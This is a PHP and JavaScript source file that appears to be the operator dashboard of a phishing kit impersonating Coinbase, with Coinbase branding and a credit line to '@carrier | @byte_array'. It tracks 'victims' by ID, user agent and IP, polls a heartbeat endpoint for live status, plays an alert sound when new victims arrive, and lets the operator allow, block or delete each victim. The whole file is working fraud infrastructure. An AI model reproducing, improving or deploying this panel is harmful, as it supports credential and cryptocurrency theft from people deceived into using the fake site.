<?php
session_start();
if(!isset($_SESSION['user_id']) && !isset($_SESSION['username'])){
    header('Location: /admin/login');
    exit;
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Coinbase</title>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css" rel="stylesheet">
<link rel="icon" href="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" type="image/png">

<style>
    body {
        background: #000;
        background-size: cover;
        height: 100vh;
        margin: 0;
        color: #e0e0e0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        padding: 0;
    }
    .navbar {
        background-color: #000;
        padding: 10px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 2px 5px rgba(0,0,0,0.5);
    }
    .navbar a {
        color: #e0e0e0;
        text-decoration: none;
        font-size: 16px;
    }
    .custom-table {
        border: 1px solid #060505;
        border-radius: 10px;
        width: 100%;
        max-width: 100%;
        overflow-x: auto;
        border-collapse: collapse;
        margin-top: 20px;
    }
    .custom-table th, .custom-table td {
        border: 1px solid #000;
        padding: 8px;
        text-align: left;
        color: #e0e0e0;
    }
    .custom-table th {
        background-color: #000;
    }
    .custom-table tbody tr {
        background-color: #000;
    }
    .custom-dropdown {
        position: relative;
        display: inline-block;
    }

    .custom-dropdown button {
        border: none !important;
    }

    .custom-dropdown-content {
        display: none;
        position: absolute;
        background-color: #000;
        min-width: 160px;
        box-shadow: 2px 8px 16px 0px rgba(0,0,0,0.3);
        z-index: 1;
        white-space: nowrap;
    }
    .custom-dropdown-content a {
        color: #e0e0e0;
        padding: 7px 16px;
        text-decoration: none;
        display: block;
        background-color: #000;
    }
    .btn, .btn-secondary {
        
        border-color: #00FF00;
    }
    .custom-dropdown-content a:hover {background-color: rgba(255, 255, 255, 0.2)}
    .status-dot {
        height: 10px;
        width: 10px;
        border-radius: 50%;
        display: inline-block;
        animation: blinker 1s linear infinite;
    }
    .status-dot.online {
        background-color: #00FF00;
    }
    .status-dot.offline {
        background-color: #FF0000;
    }
    @keyframes blinker {
        50% { opacity: 0; }
    }
    .btn, .btn-secondary {
        background-color: #262626;
        border-color: #FF0000;
    }
    .pagination {
        display: flex;
        justify-content: center;
        margin-top: 20px;
    }
    .pagination a {
        margin: 0 5px;
        text-decoration: none;
        color: #e0e0e0;
    }
    .pagination a.active {
        font-weight: bold;
    }
    .modal {
        display: none;
        position: fixed;
        z-index: 2;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto;
        background-color: rgba(0,0,0,0.6);
    }
    .modal-content {
        background-color: #060505;
        margin: 5% auto;
        padding: 20px;
        border-radius: 8px;
        border: 1px solid #444;
        width: 90%;
        max-width: 500px;
        color: #f0f0f0;
        box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        position: relative;
    }
    .close {
        color: #ccc;
        position: absolute;
        top: 10px;
        right: 10px;
        font-size: 28px;
        font-weight: bold;
        cursor: pointer;
    }
    .close:hover,
    .close:focus {
        color: #f00;
        text-decoration: none;
        transition: color 0.3s ease-in-out;
    }
    .modal input[type="text"] {
        width: 100%;
        padding: 12px 15px;
        margin: 8px 0;
        display: inline-block;
        border: 1px solid #555;
        border-radius: 5px;
        box-sizing: border-box;
        background-color: #060505;
        color: #fff;
    }
    .modal button {
        background-color: #060505;
        border: 1px solid #333;
        color: #fff;
        padding: 14px 18px;
        margin: 8px 0;
        border-radius: 5px;
        cursor: pointer;
        width: 100%;
        box-shadow: 0 2px 4px rgba(0,0,0,0.4);
    }
    .select-style {
        overflow: hidden;
        background-color: #000;
        color: #e0e0e0;
        padding: 5px 10px;
        font-size: 16px;
        outline: none;
        border: none;
    }
    .select-style option {
        background-color: #000;
        color: #e0e0e0;
    }
    .blur {
        filter: blur(4px);
        transition: filter 0.3s;
    }
    .blur:hover {
        filter: blur(0);
    }
    .updated-label {
        display: inline-block;
        width: 120px;
        padding: 4px 5px;
        border: 1px solid #000080; /* Dark blue border */
        color: #e0e0e0;
        background-color: #000;
        font-size: 10px;
        text-align: center;
        margin-top: 2px;
    }
    .not-updated-label {
        display: inline-block;
        width: 100px;
        padding: 2px 5px;
        border: 1px solid #FF0000; /* Red border */
        color: #e0e0e0;
        background-color: #000;
        font-size: 10px;
        text-align: center;
        margin-top: 2px;
    }
    @media (max-width: 768px) {
        .navbar {
            flex-direction: column;
            padding: 10px;
        }
        .navbar a {
            font-size: 14px;
        }
        .custom-table th, .custom-table td {
            padding: 6px;
            font-size: 14px;
        }
        .custom-table {
            display: block;
            overflow-x: auto;
            white-space: nowrap;
        }
        .modal-content {
            width: 90%;
            margin: 10% auto;
        }
    }
    @media (max-width: 480px) {
        .navbar {
            padding: 5px;
        }
        .navbar a {
            font-size: 12px;
        }
        .custom-table th, .custom-table td {
            padding: 4px;
            font-size: 12px;
        }
        .custom-table {
            display: block;
            overflow-x: auto;
            white-space: nowrap;
        }
    }

    .btn-red {
        background-color: #FF0000;
        border-color: #FF0000;
    }

    .btn-manage {
        border-color: #00FF00 !important;
    }

    .btn-clients {
        border-color: #28a745 !important;
        background-color: #28a745 !important;
        white-space: nowrap;
    }
    .admin-nav {
        display: flex;
        justify-content: space-between;
        background-color: #060505;
        padding: 10px;
        border-radius: 5px;
    }

    .admin-nav-link {
        color: #fff;
        text-decoration: none;
        padding: 5px 15px;
        border-radius: 3px;
        transition: background-color 0.3s;
    }

    .admin-nav-link:hover {
        background-color: #555;
    }
</style>

</head>
<body>
<div class="navbar">
    <a href="#" style="display: flex; align-items: center;">
        <img src="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" alt="Coinbase Logo" style="height: 20px; width: auto; margin-right: 10px;">
        - @carrier | @byte_array
    </a>
    <nav class="admin-nav">
        <a href="/admin" class="admin-nav-link">Dashboard</a>
        <a href="/admin/victims" class="admin-nav-link">Firewall</a>
        <a href="/admin/settings" class="admin-nav-link">Settings</a>
    </nav>
</div>
<div class="container mt-5">
    <div class="row">
        <div class="col-12">
            <table class="custom-table" id="victimsTable">
                <thead>
                    <tr>
                        <th>Victim ID</th>
                        <th>UserAgent</th>
                        <th>IP</th>
                        <th>Status</th>
                        <th>Allowed</th>
                        <th>Manage</th>
                        <th>Delete</th>
                    </tr>
                </thead>
                <tbody id="victimsData">
                </tbody>
            </table>
            <div class="pagination" id="pagination">
            </div>
        </div>
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.js"></script>


<script>
$(document).ready(function() {
        var notyf = new Notyf({position: {x: 'right', y: 'bottom'}});
        let previousData = null;
        let currentPage = 1;
        const rowsPerPage = 5;
        let lastOnlineTime = Date.now();
        let openDropdowns = new Set();
        let selectedRows = new Set();

        function fetchData() {
            fetch('/admin/victims/heartbeat')
            .then(response => response.json())
            .then(data => {
                if (JSON.stringify(data) !== JSON.stringify(previousData)) {
                    if (shouldPlayAudio(data, previousData)) {
                        playAudio();
                    }
                    previousData = data;
                    renderPageData();
                }
            });
        }

        function shouldPlayAudio(newData, oldData) {
            if (!oldData) return false; 

            return newData.some((newItem, index) => {
                const oldItem = oldData[index];
                if (!oldItem) return true; 

                return Object.keys(newItem).some(key => {
                    if (key === 'status' || key === 'current_page') return false;
                    return newItem[key] !== oldItem[key];
                });
            });
        }

        function playAudio() {
            var audio = new Audio('/message.mp3');
            audio.play().catch(error => {
                console.error("Failed to play audio:", error);
            });
        }

        function renderPageData() {
            $('#victimsData').empty();
            const startIndex = (currentPage - 1) * rowsPerPage;
            const endIndex = startIndex + rowsPerPage;
            const paginatedItems = previousData.slice(startIndex, endIndex);
            paginatedItems.forEach(victim => {
                const statusClass = victim.status == '1' ? 'online' : 'offline';
                const statusDisplay = victim.status
                $('#victimsData').append(`
                    <tr id="row-${victim.victimid}" class="${selectedRows.has(victim.victimid) ? 'selected' : ''}">
                        <td>${victim.victimid}</td>
                        <td>${victim.useragent}</td>
                        <td class="blur">${victim.ip}</td>
                        
                        <td><span class="status-dot ${statusClass}"></span> ${statusClass}</td>
                        <td>${victim.allow ? 'Yes' : 'No'}</td>
                        
                        <td>
                            <div class="custom-dropdown">
                                <button class="btn btn-secondary btn-manage" type="button" onclick="toggleDropdown(this, '${victim.victimid}')">Manage</button>
                                <div class="custom-dropdown-content" id="dropdown-${victim.victimid}">
                                    <a href="#" onclick="reportAllowClient('${victim.victimid}')">Allow Client</a>
                                    <a href="#" onclick="reportBlockClient('${victim.victimid}')">Block Client</a>
                                </div>
                            </div>
                        </td>

                        <td>
                            <button class="btn btn-secondary btn-red" type="button" onclick="reportDelete('${victim.victimid}')">Delete</button>
                        </td>
                    </tr>

                    <style>
                                .arrow {
                                    display: inline-block;
                                    transition: transform 0.3s ease;
                                }
                                
                            </style>
                `);
            });
            displayPagination(previousData.length);
            restoreOpenDropdowns();
            restoreSelectedRows();
        }

        function displayPagination(totalItems) {
            $('#pagination').empty();
            const pageCount = Math.ceil(totalItems / rowsPerPage);
            for (let i = 1; i <= pageCount; i++) {
                $('#pagination').append(`<a href="#" class="${i === currentPage ? 'active' : ''}" onclick="changePage(${i})">${i}</a>`);
            }
        }


        window.changePage = function(page) {
            if (page !== currentPage) {
                currentPage = page;
                renderPageData();
            }
        }

        fetchData();
        setInterval(fetchData, 1200);


        window.toggleDropdown = function(button, id) {
            const dropdownContent = $(button).next('.custom-dropdown-content');
            dropdownContent.toggle();
            if (dropdownContent.is(':visible')) {
                openDropdowns.add(id);
            } else {
                openDropdowns.delete(id);
            }
        }

        function restoreOpenDropdowns() {
            openDropdowns.forEach(id => {
                $(`#dropdown-${id}`).show();
            });
        }

        function restoreSelectedRows() {
            selectedRows.forEach(id => {
                $(`#row-${id}`).addClass('selected');
            });
        }

        window.reportAllowClient = function(id) {
            const url = `/admin/actions?action=allow_client&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim was allowed to enter');
        }

        window.reportBlockClient = function(id){
            const url = `/admin/actions?action=block_client&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been blocked');
        }

        window.reportDelete = function(id) {
            const url = `/admin/actions?action=delete_victim&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been deleted');
        }
        
    
});
</script>


